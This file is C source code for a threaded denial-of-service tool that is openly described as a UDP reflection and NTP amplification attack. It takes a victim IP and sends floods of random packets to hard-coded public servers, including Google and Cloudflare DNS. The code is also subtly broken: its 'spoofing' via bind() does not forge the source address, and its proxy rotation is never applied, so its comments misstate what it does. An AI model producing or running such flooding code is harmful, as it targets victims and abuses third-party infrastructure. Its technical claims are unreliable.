#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <time.h>

#define MAX_THREADS 500  // Max threads
#define AMPLIFIERS 5      // Number of reflection servers

const char *amp_servers[AMPLIFIERS] = {
    "91.189.89.199",   // NTP
    "208.67.222.222",  // OpenDNS
    "239.255.255.250", // SSDP
    "1.1.1.1",         // Cloudflare DNS
    "8.8.8.8"          // Google DNS
};

// Attack Parameters Structure
typedef struct {
    char *victim_ip;
    int victim_port;
    int duration;
    int packet_size;
} AttackParams;

// Random Proxy Rotation
char *get_random_proxy() {
    char *proxies[] = {
        "127.0.0.1:9050",  // Local SOCKS5 Proxy
        "127.0.0.1:1080",  // Local Tor Proxy
        "192.168.1.100:3128" // External Proxy
    };
    int index = rand() % (sizeof(proxies) / sizeof(proxies[0]));
    return proxies[index];
}

// UDP Reflection Attack Function
void *udp_reflection_attack(void *arg) {
    AttackParams *params = (AttackParams *)arg;
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    struct sockaddr_in amplifier, victim;
    victim.sin_family = AF_INET;
    victim.sin_port = htons(params->victim_port);
    inet_pton(AF_INET, params->victim_ip, &victim.sin_addr);

    time_t start_time = time(NULL);

    char *proxy = get_random_proxy();
    printf("[*] Using Proxy: %s\n", proxy);

    while (time(NULL) - start_time < params->duration) {
        for (int i = 0; i < AMPLIFIERS; i++) {
            amplifier.sin_family = AF_INET;
            amplifier.sin_port = htons(123);  // NTP Amplification
            inet_pton(AF_INET, amp_servers[i], &amplifier.sin_addr);

            char payload[params->packet_size];
            memset(payload, rand() % 256, params->packet_size);

            bind(sock, (struct sockaddr *)&victim, sizeof(victim));
            sendto(sock, payload, params->packet_size, 0, (struct sockaddr *)&amplifier, sizeof(amplifier));

            printf("[+] Sent Spoofed Packet to %s -> Reflecting to %s\n", amp_servers[i], params->victim_ip);
        }
        usleep(500);
    }

    close(sock);
    pthread_exit(NULL);
}

// Main Function
int main(int argc, char *argv[]) {
    if (argc < 6) {
        printf("Usage: %s <IP> <Port> <Time> <Packet Size> <Threads>\n", argv[0]);
        return 1;
    }

    char *ip = argv[1];
    int port = atoi(argv[2]);
    int time = atoi(argv[3]);
    int packet_size = atoi(argv[4]);
    int threads = atoi(argv[5]);

    if (threads > MAX_THREADS) {
        printf("[-] Max thread limit exceeded! Using %d threads.\n", MAX_THREADS);
        threads = MAX_THREADS;
    }

    pthread_t thread_pool[threads];
    AttackParams params = {ip, port, time, packet_size};

    for (int i = 0; i < threads; i++) {
        pthread_create(&thread_pool[i], NULL, udp_reflection_attack, &params);
    }

    for (int i = 0; i < threads; i++) {
        pthread_join(thread_pool[i], NULL);
    }

    printf("[+] Attack Finished!\n");
    return 0;
}
